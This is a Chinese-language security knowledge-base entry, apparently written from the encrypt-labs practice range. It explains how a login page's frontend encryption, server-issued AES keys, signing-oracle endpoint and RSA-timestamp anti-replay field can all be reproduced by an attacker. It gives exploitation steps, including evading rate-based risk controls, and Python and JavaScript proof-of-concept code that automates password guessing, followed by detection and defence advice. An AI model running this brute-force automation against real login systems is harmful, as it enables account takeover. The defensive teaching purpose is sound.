---
id: web-generic-auth-server-key-sign-oracle-replay-reproducible
title: 服务端下发密钥/代签接口不等于安全：前端加密登录的密钥、签名与防重放均可复现
type: scenario
domain: web
path: web/generic/auth
technique: server-side-key-sign-oracle-replay-repro
tags:
- auth
- frontend-encryption
- aes
- rsa
- des
- hmac
- signature
- signing-oracle
- replay
- brute-force
- yakit
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V207
  verified_at: '2026-11-07T02:09:45+08:00'
  notes: 已对照原文与全部32图核对：server_generate_key.php 返回 aes_key/aes_iv（图5，随 Cookie 变化）、yakit 序列先 GET 取 key/iv 再 POST aesserver.php（图7-9）、get-signature.php 代签后提交 signdataserver.php（图26-30）、norepeater.php 的 random=RSA(Date.now()) 且原文明确未除1000、yak timeenc 用 timestamp()*1000（图31-32）均一致；DES 用户名派生 key/iv 规则与图17-21一致。未验证点：原文为 encrypt-labs 靶场，未涉及真实目标；未标注组件版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-server-key-sign-oracle-replay-reproducible/
draft: false
kb_aliases:
- 服务端下发 AES key
- 代签接口签名 oracle
- get-signature.php 滥用
- 客户端时间戳防重放绕过
- 前端加密登录自动化
- server_generate_key 复现
- RSA 加密时间戳重放
---

## 一句话结论

登录页把“密钥放服务端”“签名由服务端代签”“时间戳加密后作防重放随机数”当作安全增强，但只要客户端能取到密钥、能让服务端为任意凭据代签，或用前端公钥加密当前时间戳，这些机制都可被攻击者在同一会话内原样复现；前端加密只阻止明文抓包与简单重放，不阻止自动化口令爆破。

## 原理

- **服务端下发密钥不是秘密**：登录前 `GET /server_generate_key.php` 返回 `aes_key`/`aes_iv`（Base64），前端立即用它们做 AES-CBC 加密。密钥虽由服务端生成，但接口对客户端开放且通常绑定 Cookie/会话；攻击者用同一 Cookie 先取 key/iv，再加密任意口令提交即可。多次请求 key 会随 Cookie 变化，因此自动化时必须先取后加密、保持同一会话。
- **代签接口是签名 oracle**：为隐藏 HMAC 密钥，前端先 `POST /get-signature.php` 提交 `{username,password,timestamp}`，服务端返回 `signature`，前端再连同原始字段提交登录。服务端为攻击者提供的任意凭据计算合法签名，等于把“签名能力”借给了攻击者；攻击者只需两步序列（取签名 → 提交）即可爆破，密钥是否在前端根本不重要。
- **客户端可复现的防重放无效**：`random` 字段是 `RSA(timestamp)`，公钥硬编码在前端且 `Date.now()` 未除以 1000；攻击者用同一公钥加密当前毫秒时间戳作为 `random`，服务端认为“时间戳新鲜”而放行。防重放要求随机数由服务端签发并一次性核销，或由服务端校验不可预测的 nonce；客户端可生成/可加密的值不满足。
- **派生密钥也可能公开**：若 DES/AES 的 key/iv 由 `username.slice(0,8).padEnd(8,'6')`、`'9999'+username.slice(0,4).padEnd(4,'9')` 这类规则从公开用户名派生，攻击者直接按同一规则算出 key/iv，加密任意口令。
- **共同根因**：前端的职责是“把请求变成服务端能验的格式”，因此客户端必须持有或能获得所有必要材料。任何只依赖客户端保密性的加密/签名/防重放设计，都无法区分真实用户与自动化脚本；真正的安全边界只能来自服务端侧的速率限制、失败锁定、验证码、风险控制与不可预测的一次性挑战。
- **自动化的实现方式**：用 yak/Python/JS 复刻加解密函数，并把“取 key/取签名/加密/提交”编排成有状态序列（前一响应提取字段供后一请求使用），即可对登录接口做字典爆破。

## 触发条件

- 登录接口的请求体被前端加密/加签，但加密密钥、密钥下发接口或签名接口对未认证客户端可达。
- 服务端签名接口接受任意用户提交的业务字段并返回签名，且不校验调用者是否已完成人机验证。
- 防重放字段由客户端生成，或其加密/签名可被客户端复现。
- 登录接口缺少速率限制、失败锁定、验证码或异常行为检测。
- 攻击者可保持会话 Cookie 一致地完成多步请求。

## 利用步骤

1. 逆向登录页 JS（去混淆），列出加密算法、key/iv 来源、签名公式、时间戳/随机数字段与请求字段名。
2. 若 key/iv 来自服务端接口：先请求该接口，记录 Cookie 与返回的 key/iv；在后续加密与登录请求中复用同一 Cookie。
3. 若签名来自服务端接口：构造第一步请求（username/password/timestamp），提取返回的 `signature`，原样放入第二步登录请求。
4. 若防重放字段是 `RSA(timestamp)`：用前端公钥按同样填充（PKCS#1 v1.5）加密当前时间戳（注意毫秒/秒与字符串格式），每个请求重新生成。
5. 若 key/iv 由用户名派生：按 JS 的切片/填充规则计算 key/iv，直接本地加密。
6. 把上述逻辑写成脚本或自动化序列，用口令字典逐条构造合法请求并提交，按响应 `success`/错误信息判断命中。
7. 控制请求速率，避免触发风控；记录命中凭据与验证方式。

## PoC

```python
# Python 示意：服务端下发 AES key + 代签 + RSA 时间戳防重放
import base64, json, time, requests
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Util.Padding import pad

BASE = "http://target"
PUB = RSA.import_key(open("pub.pem").read())
s = requests.Session()

def server_key():
    d = s.get(f"{BASE}/encrypt/server_generate_key.php").json()   # 同一 Session 保持 Cookie
    return base64.b64decode(d["aes_key"]), base64.b64decode(d["aes_iv"])

def aes_encrypt(key, iv, obj):
    return base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(
        pad(json.dumps(obj, separators=(",", ":")).encode(), 16))).decode()

# 场景 1：服务端下发 key/iv
key, iv = server_key()
ct = aes_encrypt(key, iv, {"username": "admin", "password": "guess"})
s.post(f"{BASE}/encrypt/aesserver.php", json={"encryptedData": ct})

# 场景 2：服务端代签（签名 oracle）
ts = int(time.time())
sig = s.post(f"{BASE}/encrypt/get-signature.php",
             json={"username": "admin", "password": "guess", "timestamp": ts}).json()["signature"]
s.post(f"{BASE}/encrypt/signdataserver.php",
       json={"username": "admin", "password": "guess", "timestamp": ts, "signature": sig})

# 场景 3：RSA 加密当前毫秒时间戳作为防重放 random
random_field = base64.b64encode(PKCS1_v1_5.new(PUB).encrypt(
    str(int(time.time() * 1000)).encode())).decode()
s.post(f"{BASE}/encrypt/norepeater.php",
       json={"username": "admin", "password": "guess", "random": random_field})
```

```javascript
// 用户名派生 DES key/iv（示意）
const key = CryptoJS.enc.Utf8.parse(username.slice(0, 8).padEnd(8, '6'));
const iv  = CryptoJS.enc.Utf8.parse('9999' + username.slice(0, 4).padEnd(4, '9'));
const ct  = CryptoJS.DES.encrypt(password, key, {
  iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
}).ciphertext.toString(CryptoJS.enc.Hex);
```

## 变体与关联

- 变体：key/iv 接口不绑定 Cookie 但绑定 CSRF token/一次性 nonce；自动化需先抓取页面 token 再取 key。
- 变体：代签接口要求先通过滑块/验证码；若验证码可被 OCR/复用，仍可代签，结合验证码弱点。
- 变体：防重放随机数为 `HMAC(timestamp, public_salt)`、`MD5(timestamp)` 等可复现形式，同样失效。
- 变体：前端加密使用 WebAssembly/SM4/自定义算法时，可把 wasm/JS 函数在 Node 或浏览器 JSRPC 中直接调用，避免手动重写。
- 关联：[[web-generic-auth-hybrid-rsa-aes-login-bruteforce]]（RSA 包裹 AES 的混合加密爆破）、[[web-generic-auth-client-nonce-weak-sha1-signature-forgery]]（客户端 nonce 防重放失效）、[[web-generic-auth-bastion-frontend-3des-login-forgery]]（前端 3DES 派生密钥复现）、[[code-analysis-reverse-frontend-request-response-encryption-automation]]（JS 逆向与自动化框架）。

## 检测与防御

- 防御：不要把“密钥放服务端/代签”当作安全边界；登录接口必须在服务端做速率限制、失败计数、账号锁定、验证码与风险评分。
- 防御：签名密钥只留在服务端，且代签接口必须绑定已通过人机验证的会话、限制签名内容与频率，不能为任意凭据签发。
- 防御：防重放使用服务端签发的一次性 nonce/challenge，服务端记录并核销；不要用客户端可生成的 timestamp/random。
- 防御：客户端加密使用标准库与随机 key/iv，但明确其只防明文抓包；真正校验放服务端。
- 检测：同一 IP/账号短时间大量登录失败；同一会话先调 key/签名接口再高频登录；`get-signature` 调用量与登录尝试量近似 1:1；RSA 时间戳字段每次不同但间隔极短。
